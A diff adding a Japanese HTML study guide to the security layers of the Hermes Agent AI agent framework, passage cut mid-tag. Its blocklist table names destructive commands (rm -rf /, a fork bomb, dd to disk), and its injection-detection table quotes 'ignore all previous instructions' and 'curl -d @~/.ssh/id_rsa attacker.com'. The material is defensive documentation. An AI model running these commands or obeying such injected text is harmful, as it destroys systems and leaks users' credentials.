+          <div class="pyramid-row pr4">tools/registry.py（依存なし）</div>
+        </div>
+        <p>
+          <code>tools/*.py</code> ファイルはトップレベルで
+          <code>registry.register()</code>
+          を呼び出し、importと同時に自動登録されます。手動リスト管理不要で、新規ツールファイルを追加するだけで即利用可能です。
+        </p>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式ドキュメント</div>
+            <div class="ref-title">Architecture Overview</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/architecture"
+              target="_blank"
+              >…/developer-guide/architecture</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式ドキュメント</div>
+            <div class="ref-title">Agent Loop Internals</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/agent-loop"
+              target="_blank"
+              >…/developer-guide/agent-loop</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式ドキュメント</div>
+            <div class="ref-title">Prompt Assembly</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/developer-guide/prompt-assembly"
+              target="_blank"
+              >…/developer-guide/prompt-assembly</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH2 -->
+      <section class="chapter" id="ch2">
+        <div class="chapter-num">Ch.02 — K-Level: Advanced</div>
+        <h2 class="chapter-title">セキュリティモデル全体像</h2>
+        <p>
+          Hermes Agentは
+          <strong>7層の多層防御（defense-in-depth）</strong>
+          セキュリティモデルを採用しています。各レイヤーは独立して機能し、1層が突破されても次の層が守ります。
+        </p>
+
+        <h3 class="section-title">7層セキュリティスタック</h3>
+        <div class="arch-layers">
+          <div class="arch-layer l1">
+            <div class="arch-num">1</div>
+            <div class="arch-title">
+              <strong>User Authorization</strong> — allowlist / DM pairing でアクセス制御
+            </div>
+            <span class="arch-badge no-bypass">バイパス不可</span>
+          </div>
+          <div class="arch-layer l2">
+            <div class="arch-num">2</div>
+            <div class="arch-title">
+              <strong>Dangerous Command Approval</strong> — 破壊的操作の人間ループ確認
+            </div>
+            <span class="arch-badge bypass">YOLO で一部迂回可</span>
+          </div>
+          <div class="arch-layer l3">
+            <div class="arch-num">3</div>
+            <div class="arch-title">
+              <strong>Container Isolation</strong> — Docker/Singularity/Modal サンドボックス
+            </div>
+            <span class="arch-badge auto">コンテナが境界</span>
+          </div>
+          <div class="arch-layer l4">
+            <div class="arch-num">4</div>
+            <div class="arch-title">
+              <strong>MCP Credential Filtering</strong> — サブプロセスへの環境変数分離
+            </div>
+            <span class="arch-badge no-bypass">allowlist のみ通過</span>
+          </div>
+          <div class="arch-layer l5">
+            <div class="arch-num">5</div>
+            <div class="arch-title">
+              <strong>Context File Scanning</strong> — AGENTS.md 等のプロンプトインジェクション検出
+            </div>
+            <span class="arch-badge no-bypass">自動・無効化不可</span>
+          </div>
+          <div class="arch-layer l6">
+            <div class="arch-num">6</div>
+            <div class="arch-title">
+              <strong>Cross-Session Isolation</strong> —
+              セッション間データアクセス不可、パストラバーサル対策
+            </div>
+            <span class="arch-badge no-bypass">自動</span>
+          </div>
+          <div class="arch-layer l7">
+            <div class="arch-num">7</div>
+            <div class="arch-title">
+              <strong>Input Sanitization</strong> — working directory パラメータを allowlist で検証
+            </div>
+            <span class="arch-badge no-bypass">自動</span>
+          </div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">ℹ</div>
+          <div>
+            Layer 3（コンテナバックエンド）を使用すると Layer
+            2（危険コマンド承認）はスキップされます。コンテナ自体がセキュリティ境界となるため、コンテナ内の破壊的コマンドはホストを傷つけられません。本番環境では
+            <strong>docker / modal / daytona</strong>
+            バックエンドを使用することで承認プロンプトなしの完全自動化が実現できます。
+          </div>
+        </div>
+
+        <h3 class="section-title">セキュリティ優先度スコア</h3>
+        <div class="progress-item">
+          <div class="progress-label">User Authorization</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar green" style="--w: 100%"></div>
+          </div>
+          <div class="progress-pct">100%</div>
+        </div>
+        <div class="progress-item">
+          <div class="progress-label">Hardline Blocklist</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar green" style="--w: 100%"></div>
+          </div>
+          <div class="progress-pct">100%</div>
+        </div>
+        <div class="progress-item">
+          <div class="progress-label">Context File Scan</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar green" style="--w: 95%"></div>
+          </div>
+          <div class="progress-pct">95%</div>
+        </div>
+        <div class="progress-item">
+          <div class="progress-label">Container Isolation</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar green" style="--w: 90%"></div>
+          </div>
+          <div class="progress-pct">90%</div>
+        </div>
+        <div class="progress-item">
+          <div class="progress-label">Command Approval</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar amber" style="--w: 75%"></div>
+          </div>
+          <div class="progress-pct">75%</div>
+        </div>
+        <div class="progress-item">
+          <div class="progress-label">MCP Filtering</div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar amber" style="--w: 80%"></div>
+          </div>
+          <div class="progress-pct">80%</div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Security Model Overview</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security"
+              target="_blank"
+              >…/user-guide/security</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH3 -->
+      <section class="chapter" id="ch3">
+        <div class="chapter-num">Ch.03 — K-Level: Intermediate→Advanced</div>
+        <h2 class="chapter-title">コマンド承認システムの詳細設計</h2>
+
+        <h3 class="section-title">承認モード 3種類の比較</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>モード</th>
+                <th>動作</th>
+                <th>推奨環境</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>manual</code> <strong>【デフォルト】</strong></td>
+                <td>危険コマンドは常にユーザーへ承認プロンプトを表示</td>
+                <td>個人開発・インタラクティブ利用</td>
+              </tr>
+              <tr>
+                <td><code>smart</code></td>
+                <td>
+                  補助LLMがリスク評価。低リスク→自動承認、高リスク→自動拒否、不明→手動プロンプト
+                </td>
+                <td>本番ゲートウェイ（推奨）</td>
+              </tr>
+              <tr>
+                <td><code>off</code></td>
+                <td>全承認チェック無効。<code>--yolo</code> と同等</td>
+                <td>CI/CD・コンテナ内のみ</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">Hardline Blocklist — YOLO 時も機能する絶対防壁</h3>
+        <p>
+          以下のパターンは <code>--yolo</code>、<code>approvals.mode: off</code>、<code
+            >cron_mode: approve</code
+          >、「常に許可」クリックのいずれの状況でも <strong>絶対にブロック</strong> されます。
+        </p>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>パターン</th>
+                <th>理由</th>
+                <th>バイパス可否</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>rm -rf /</code> とその変形</td>
+                <td>ファイルシステムルートを完全削除</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+              <tr>
+                <td><code>rm -rf --no-preserve-root /</code></td>
+                <td>明示的ルート削除フラグ</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+              <tr>
+                <td><code>:(){ :|:&amp; };:</code> fork bomb</td>
+                <td>再起動まで全CPU占有</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+              <tr>
+                <td><code>mkfs.*</code> マウント済みルートデバイス</td>
+                <td>稼働中システムのフォーマット</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+              <tr>
+                <td><code>dd if=/dev/zero of=/dev/sd*</code></td>
+                <td>物理ディスクのゼロ埋め</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+              <tr>
+                <td>信頼できないURLを <code>sh</code> へパイプ</td>
+                <td>RCE攻撃ベクター</td>
+                <td><span class="badge-no">✗ 絶対不可</span></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">承認フロー — CLI vs Gateway</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart TD A["コマンド実行要求"] --> B{Hardline Blocklist?} B -->|Yes|
+            BLOCK["無条件ブロック\n設定に関係なく"] B -->|No| T["tirith スキャン"] T -->
+            C{approvals.mode} C -->|manual| D["ユーザー承認プロンプト\n60秒タイムアウト後 DENY"] C
+            -->|smart| E["補助 LLM がリスク評価\n低リスク→自動承認\n高リスク→自動拒否\n不明→手動"] C
+            -->|off| G["全コマンド自動承認"] D --> H{"once / session\n/ always / deny"} E --> H G
+            --> RUN["実行"] H -->|allow| RUN H -->|deny| DENY["拒否"]
+          </div>
+        </div>
+
+        <h3 class="section-title">良い例 / 悪い例</h3>
+        <div class="compare-grid">
+          <div class="compare-card good">
+            <div class="compare-label">✅ 本番ゲートウェイ推奨</div>
+            <div class="compare-code">
+              approvals: mode: smart timeout: 120 cron_mode: deny destructive_slash_confirm: true
+            </div>
+          </div>
+          <div class="compare-card bad">
+            <div class="compare-label">❌ 絶対にやらない設定</div>
+            <div class="compare-code">
+              approvals: mode: off # 本番cronで # cron_mode: approve # も同様に危険
+            </div>
+          </div>
+        </div>
+
+        <div class="callout danger">
+          <div class="callout-icon">⛔</div>
+          <div>
+            <strong>cron_mode: approve</strong> は headless で動作する cron
+            ジョブが危険コマンドを自動承認します。本番環境では絶対に使用しないでください。デフォルトの
+            <code>cron_mode: deny</code> を維持することを強く推奨します。
+          </div>
+        </div>
+
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/config.yaml</span
+          ><span class="cm"># 本番ゲートウェイ推奨設定</span>
+
+          <span class="cc">approvals</span>: <span class="cc">mode</span>:
+          <span class="cs">smart</span> <span class="cm"># LLM リスク評価</span>
+          <span class="cc">timeout</span>: <span class="cg">120</span>
+          <span class="cm"># 応答遅延を考慮</span> <span class="cc">cron_mode</span>:
+          <span class="cs">deny</span> <span class="cm"># headless cron は常に拒否</span>
+          <span class="cc">mcp_reload_confirm</span>: <span class="ck">true</span>
+          <span class="cc">destructive_slash_confirm</span>: <span class="ck">true</span>
+
+          <span class="cm"># 恒久許可パターン（慎重に追加）</span>
+          <span class="cc">command_allowlist</span>: -
+          <span class="cs">systemctl restart nginx</span> <span class="cm"># 特定サービスのみ</span>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Dangerous Command Approval</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#dangerous-command-approval"
+              target="_blank"
+              >…/security#dangerous-command-approval</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Hardline Blocklist (Always-On Floor)</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#hardline-blocklist-always-on-floor"
+              target="_blank"
+              >…/security#hardline-blocklist</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH4 -->
+      <section class="chapter" id="ch4">
+        <div class="chapter-num">Ch.04 — K-Level: Intermediate</div>
+        <h2 class="chapter-title">ユーザー認可 &amp; DM Pairing</h2>
+
+        <h3 class="section-title">認可チェックの優先順位</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart TD A["受信メッセージ"] -->
+            B{プラットフォーム別\nallow-all?\nDISCORD_ALLOW_ALL_USERS} B -->|Yes|
+            ALLOW["アクセス許可"] B -->|No| C{DM Pairing\n承認済み?} C -->|Yes| ALLOW C -->|No|
+            D{プラットフォーム別 allowlist?\nTELEGRAM_ALLOWED_USERS} D -->|Yes| ALLOW D -->|No|
+            E{グローバル allowlist?\nGATEWAY_ALLOWED_USERS} E -->|Yes| ALLOW E -->|No|
+            F{GATEWAY_ALLOW\n_ALL_USERS?} F -->|Yes| ALLOW F -->|No| DENY["拒否\n(Default)"]
+          </div>
+        </div>
+
+        <div class="alert red">
+          ⚠ allowlist
+          が何も設定されていない場合、全ユーザーがデフォルトで拒否されます。ゲートウェイ起動時にログへ警告が出力されます。
+        </div>
+
+        <h3 class="section-title">DM Pairing — OWASP 準拠のセキュアなユーザー追加フロー</h3>
+        <ul class="step-list">
+          <li class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">未知のユーザーが DM を送信</div>
+              <div class="step-desc">
+                Bot は 8文字ペアリングコードを返信（0/O/1/I を除く32文字、<code
+                  >secrets.choice()</code
+                >
+                で暗号学的生成）
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Bot 運営者が CLI で確認・承認</div>
+              <div class="step-desc">
+                <code>hermes pairing list</code> で保留リスト確認後、<code
+                  >hermes pairing approve telegram ABC12DEF</code
+                >
+                で承認
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">ユーザーが永続承認リストへ追加</div>
+              <div class="step-desc">
+                <code>~/.hermes/pairing/{platform}-approved.json</code>（chmod
+                0600）に保存。以降の全メッセージが処理される。
+              </div>
+            </div>
+          </li>
+        </ul>
+
+        <h3 class="section-title">Pairing セキュリティ仕様（OWASP + NIST SP 800-63-4 準拠）</h3>
+        <div class="exam-grid">
+          <div class="exam-card">
+            <div class="exam-title">コード形式</div>
+            <div class="exam-value">8文字</div>
+            <div class="exam-stars">★★★★★</div>
+          </div>
+          <div class="exam-card">
+            <div class="exam-title">TTL</div>
+            <div class="exam-value">1時間</div>
+            <div class="exam-stars">★★★★☆</div>
+          </div>
+          <div class="exam-card">
+            <div class="exam-title">レート制限</div>
+            <div class="exam-value">10分/回</div>
+            <div class="exam-stars">★★★★★</div>
+          </div>
+          <div class="exam-card">
+            <div class="exam-title">ロックアウト</div>
+            <div class="exam-value">5回失敗→1h</div>
+            <div class="exam-stars">★★★★★</div>
+          </div>
+          <div class="exam-card">
+            <div class="exam-title">保留上限</div>
+            <div class="exam-value">3件/Platform</div>
+            <div class="exam-stars">★★★☆☆</div>
+          </div>
+          <div class="exam-card">
+            <div class="exam-title">ファイル権限</div>
+            <div class="exam-value">chmod 0600</div>
+            <div class="exam-stars">★★★★★</div>
+          </div>
+        </div>
+
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/.env</span
+          ><span class="cm"># プラットフォーム別 allowlist</span>
+          <span class="cc">TELEGRAM_ALLOWED_USERS</span>=<span class="cs">123456789,987654321</span>
+          <span class="cc">DISCORD_ALLOWED_USERS</span>=<span class="cs">111222333444555666</span>
+          <span class="cc">SLACK_ALLOWED_USERS</span>=<span class="cs">U01ABC123</span>
+          <span class="cc">GATEWAY_ALLOWED_USERS</span>=<span class="cs">123456789</span>
+
+          <span class="cm"># ❌ 本番では使わない</span>
+          <span class="cr"># GATEWAY_ALLOW_ALL_USERS=true</span>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">User Authorization (Gateway)</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#user-authorization-gateway"
+              target="_blank"
+              >…/security#user-authorization-gateway</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">DM Pairing System</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#dm-pairing-system"
+              target="_blank"
+              >…/security#dm-pairing-system</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH5 -->
+      <section class="chapter" id="ch5">
+        <div class="chapter-num">Ch.05 — K-Level: Advanced</div>
+        <h2 class="chapter-title">コンテナ分離とサンドボックス戦略</h2>
+
+        <h3 class="section-title">ターミナルバックエンド セキュリティ比較</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>バックエンド</th>
+                <th>分離レベル</th>
+                <th>危険コマンドチェック</th>
+                <th>推奨用途</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>local</code></td>
+                <td>なし（ホスト直接）</td>
+                <td><span class="badge-yes">✓ あり</span></td>
+                <td>開発・個人利用</td>
+              </tr>
+              <tr>
+                <td><code>ssh</code></td>
+                <td>リモートマシン</td>
+                <td><span class="badge-yes">✓ あり</span></td>
+                <td>別サーバー実行</td>
+              </tr>
+              <tr>
+                <td><code>docker</code> <strong>【推奨】</strong></td>
+                <td>コンテナ</td>
+                <td><span class="badge-no">✗ スキップ</span></td>
+                <td>本番ゲートウェイ</td>
+              </tr>
+              <tr>
+                <td><code>singularity</code></td>
+                <td>コンテナ</td>
+                <td><span class="badge-no">✗ スキップ</span></td>
+                <td>HPC 環境</td>
+              </tr>
+              <tr>
+                <td><code>modal</code></td>
+                <td>クラウドサンドボックス</td>
+                <td><span class="badge-no">✗ スキップ</span></td>
+                <td>スケーラブルなクラウド</td>
+              </tr>
+              <tr>
+                <td><code>daytona</code></td>
+                <td>クラウドサンドボックス（永続化）</td>
+                <td><span class="badge-no">✗ スキップ</span></td>
+                <td>永続クラウドワークスペース</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">Docker ハードニングフラグ（全コンテナ適用）</h3>
+        <div class="code-block">
+          <span class="code-tag">tools/environments/docker.py</span
+          ><span class="cc">_SECURITY_ARGS</span> = [ <span class="cs">"--cap-drop"</span>,
+          <span class="cs">"ALL"</span>, <span class="cm"># 全 Linux capabilities を drop</span>
+          <span class="cs">"--cap-add"</span>, <span class="cs">"DAC_OVERRIDE"</span>,
+          <span class="cm"># bind-mount ディレクトリへの書き込み</span>
+          <span class="cs">"--cap-add"</span>, <span class="cs">"CHOWN"</span>,
+          <span class="cm"># パッケージマネージャー用</span> <span class="cs">"--cap-add"</span>,
+          <span class="cs">"FOWNER"</span>, <span class="cm"># パッケージマネージャー用</span>
+          <span class="cs">"--security-opt"</span>, <span class="cs">"no-new-privileges"</span>,
+          <span class="cm"># 特権昇格ブロック</span> <span class="cs">"--pids-limit"</span>,
+          <span class="cs">"256"</span>, <span class="cm"># プロセス数制限</span>
+          <span class="cs">"--tmpfs"</span>, <span class="cs">"/tmp:rw,nosuid,size=512m"</span>,
+          <span class="cs">"--tmpfs"</span>,
+          <span class="cs">"/var/tmp:rw,noexec,nosuid,size=256m"</span>,
+          <span class="cs">"--tmpfs"</span>,
+          <span class="cs">"/run:rw,noexec,nosuid,size=64m"</span>, ]
+        </div>
+
+        <h3 class="section-title">SSH + 専用ワーカー構成（最高水準の分離）</h3>
+        <div class="mermaid-wrap">
+          <div class="mermaid">
+            flowchart LR subgraph GH["ゲートウェイホスト（低権限）"] GW["hermes
+            gateway\nTelegram/Discord 受信"] end subgraph WH["ワーカーホスト（分離）"]
+            WK["コマンド実行\nterminal / file / code"] end subgraph LLM["LLM Provider"] P["Nous
+            Portal / OpenRouter"] end GW <-->|"SSH (専用キー)"| WK GW <-->|"HTTPS"| P
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Container Isolation</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#container-isolation"
+              target="_blank"
+              >…/security#container-isolation</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式ユーザーガイド</div>
+            <div class="ref-title">Docker</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/docker"
+              target="_blank"
+              >…/user-guide/docker</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH6 -->
+      <section class="chapter" id="ch6">
+        <div class="chapter-num">Ch.06 — K-Level: Advanced</div>
+        <h2 class="chapter-title">クレデンシャル安全管理</h2>
+
+        <h3 class="section-title">サンドボックス別フィルタリング動作</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>サンドボックス</th>
+                <th>デフォルトフィルター</th>
+                <th>パススルー上書き</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>execute_code</code></td>
+                <td>KEY/TOKEN/SECRET/PASSWORD/AUTH を含む変数名をブロック</td>
+                <td>スキル宣言 or config で許可</td>
+              </tr>
+              <tr>
+                <td><code>terminal (local)</code></td>
+                <td>Hermes インフラ変数（プロバイダーキー・GW トークン）をブロック</td>
+                <td>env_passthrough リストで許可</td>
+              </tr>
+              <tr>
+                <td><code>terminal (docker)</code></td>
+                <td>ホスト環境変数は全てデフォルトブロック</td>
+                <td>スキル宣言で自動フォワード</td>
+              </tr>
+              <tr>
+                <td><code>terminal (modal)</code></td>
+                <td>ホスト環境・ファイルはデフォルトブロック</td>
+                <td>クレデンシャルファイルのマウント</td>
+              </tr>
+              <tr>
+                <td><code>MCP</code></td>
+                <td>PATH/HOME/USER/LANG/LC_ALL/TERM/SHELL/TMPDIR/XDG_* 以外を全ブロック</td>
+                <td>MCP env config で許可</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">スキルによる自動パススルー（推奨）vs 手動設定（非推奨）</h3>
+        <div class="compare-grid">
+          <div class="compare-card good">
+            <div class="compare-label">✅ スキル frontmatter で宣言（v0.5.1+）</div>
+            <div class="compare-code">
+              required_environment_variables: - name: GITHUB_TOKEN prompt: GitHub PAT help:
+              github.com/settings/tokens required_credential_files: - path: google_token.json
+              description: OAuth2 token # Docker/Modalに自動フォワード
+            </div>
+          </div>
+          <div class="compare-card bad">
+            <div class="compare-label">❌ インフラキーをパススルーに追加</div>
+            <div class="compare-code">
+              terminal: env_passthrough: # NG: プロバイダーAPIキーは # 絶対に追加しない -
+              OPENAI_API_KEY - TELEGRAM_BOT_TOKEN
+            </div>
+          </div>
+        </div>
+
+        <div class="callout info">
+          <div class="callout-icon">ℹ</div>
+          <div>
+            v0.5.1 以降、スキルが宣言した環境変数は Docker/Modal コンテナへ
+            <strong>自動でフォワード</strong> されます。<code>docker_forward_env</code>
+            への手動追加は不要です。
+          </div>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Environment Variable Passthrough</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#environment-variable-passthrough"
+              target="_blank"
+              >…/security#env-passthrough</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH7 -->
+      <section class="chapter" id="ch7">
+        <div class="chapter-num">Ch.07 — K-Level: Advanced</div>
+        <h2 class="chapter-title">MCP セキュリティ設計</h2>
+
+        <h3 class="section-title">MCP stdio プロセスの環境変数フィルタリング</h3>
+        <div class="alert cyan">
+          MCPサーバーのサブプロセスはホストから PATH / HOME / USER / LANG / LC_ALL / TERM / SHELL /
+          TMPDIR + XDG_* 変数のみ受け取ります。APIキー・トークン等は全て除去されます。
+        </div>
+
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/config.yaml</span><span class="cc">mcp_servers</span>:
+          <span class="cc">github</span>: <span class="cc">command</span>:
+          <span class="cs">"npx"</span> <span class="cc">args</span>: [<span class="cs">"-y"</span>,
+          <span class="cs">"@modelcontextprotocol/server-github"</span>]
+          <span class="cc">env</span>: <span class="cg">GITHUB_PERSONAL_ACCESS_TOKEN</span>:
+          <span class="cs">"ghp_..."</span> <span class="cm"># これのみ渡される</span>
+
+          <span class="cc">local-db</span>: <span class="cc">command</span>: [<span class="cs"
+            >"npx"</span
+          >, <span class="cs">"mcp-server-sqlite"</span>, <span class="cs">"--db"</span>,
+          <span class="cs">"~/db.sqlite"</span>] <span class="cm"># env なし = 最小権限</span>
+        </div>
+
+        <h3 class="section-title">クレデンシャルの自動リダクション</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>パターン</th>
+                <th>例</th>
+                <th>置換後</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>GitHub PAT</td>
+                <td><code>ghp_abc123...</code></td>
+                <td><code>[REDACTED]</code></td>
+              </tr>
+              <tr>
+                <td>OpenAI 系キー</td>
+                <td><code>sk-abc123...</code></td>
+                <td><code>[REDACTED]</code></td>
+              </tr>
+              <tr>
+                <td>Bearer トークン</td>
+                <td><code>Bearer eyJ...</code></td>
+                <td><code>[REDACTED]</code></td>
+              </tr>
+              <tr>
+                <td>パラメータ値</td>
+                <td><code>token=xxx, password=yyy</code></td>
+                <td><code>[REDACTED]</code></td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3 class="section-title">SSRF 保護の設計原則</h3>
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/config.yaml</span><span class="cc">security</span>:
+          <span class="cc">website_blocklist</span>: <span class="cc">enabled</span>:
+          <span class="ck">true</span> <span class="cc">domains</span>: -
+          <span class="cs">"*.internal.company.com"</span>
+
+          <span class="cm"># SSRF 保護（デフォルト有効）</span>
+          <span class="cm"># RFC 1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16</span>
+          <span class="cm"># ループバック: 127.0.0.0/8, ::1</span>
+          <span class="cm"># リンクローカル: 169.254.0.0/16 (クラウドメタデータ含む)</span>
+          <span class="cm"># DNS 失敗はブロックとして扱う (fail-closed)</span>
+          <span class="cm"># リダイレクトチェーンは各ホップで再検証</span>
+          <span class="cc">allow_private_urls</span>: <span class="ck">false</span>
+          <span class="cm"># デフォルト false を維持</span>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">MCP Credential Handling</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#mcp-credential-handling"
+              target="_blank"
+              >…/security#mcp-credential-handling</a
+            >
+          </div>
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">SSRF Protection</div>
+            <a
+              class="ref-url"
+              href="https://hermes-agent.nousresearch.com/docs/user-guide/security#ssrf-protection"
+              target="_blank"
+              >…/security#ssrf-protection</a
+            >
+          </div>
+        </div>
+      </section>
+
+      <!-- CH8 -->
+      <section class="chapter" id="ch8">
+        <div class="chapter-num">Ch.08 — K-Level: Advanced</div>
+        <h2 class="chapter-title">サプライチェーンセキュリティ</h2>
+
+        <h3 class="section-title">Tirith プリエグゼキューションスキャン</h3>
+        <div class="trend-card">
+          <div class="trend-title">tirith が検出する脅威</div>
+          <div class="trend-desc">
+            ホモグラフURL詐欺（国際化ドメイン攻撃）/ パイプ to インタープリタ（curl | bash）/
+            ターミナルインジェクション攻撃
+          </div>
+        </div>
+
+        <div class="code-block">
+          <span class="code-tag">~/.hermes/config.yaml</span><span class="cc">security</span>:
+          <span class="cc">tirith_enabled</span>: <span class="ck">true</span>
+          <span class="cm"># デフォルト: true</span> <span class="cc">tirith_timeout</span>:
+          <span class="cg">5</span> <span class="cm"># サブプロセスタイムアウト（秒）</span>
+          <span class="cc">tirith_fail_open</span>: <span class="ck">false</span>
+          <span class="cm"># 高セキュリティ: tirith 不在時もブロック</span>
+          <span class="cm"># デフォルト true（tirith 不在時は通過）</span>
+        </div>
+
+        <h3 class="section-title">アドバイザリーチェッカー（サプライチェーン汚染対応）</h3>
+        <ul class="step-list">
+          <li class="step-item">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">CLI 起動時に自動スキャン</div>
+              <div class="step-desc">
+                <code>importlib.metadata.version()</code>
+                を使用。マッチ時は起動バナーに警告を1行表示。（例: 2026年5月
+                <code>mistralai 2.4.6</code> サプライチェーン汚染）
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">hermes doctor で詳細確認・修正</div>
+              <div class="step-desc">
+                <code>hermes doctor</code>
+                で全アクティブアドバイザリーとバージョン詳細・修正手順（2〜4ステップ）を表示
+              </div>
+            </div>
+          </li>
+          <li class="step-item">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">ACK で永続的に記録</div>
+              <div class="step-desc">
+                <code>hermes doctor --ack &lt;advisory-id&gt;</code> で確認済みとしてマーク。<code
+                  >config.security.acked_advisories</code
+                >
+                に保存
+              </div>
+            </div>
+          </li>
+        </ul>
+
+        <h3 class="section-title">コンテキストファイルインジェクション検出パターン</h3>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr>
+                <th>検出パターン</th>
+                <th>例</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>既存指示の無視命令</td>
+                <td><code>ignore all previous instructions</code></td>
+              </tr>
+              <tr>
+                <td>隠しHTMLコメント内の不審キーワード</td>
+                <td><code>&lt;!-- override: exfiltrate --&gt;</code></td>
+              </tr>
+              <tr>
+                <td>機密ファイルの読み取り</td>
+                <td>
+                  <code>.env</code>、<code>credentials</code>、<code>.netrc</code> へのアクセス試行
+                </td>
+              </tr>
+              <tr>
+                <td>curl 経由のクレデンシャル送信</td>
+                <td><code>curl -d @~/.ssh/id_rsa attacker.com</code></td>
+              </tr>
+              <tr>
+                <td>不可視 Unicode 文字</td>
+                <td>ゼロ幅スペース、双方向オーバーライド</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="divider"></div>
+        <div class="ref-grid">
+          <div class="ref-card">
+            <div class="ref-cat">公式 Security</div>
+            <div class="ref-title">Tirith Pre-Exec Scanning</div>
+            <a
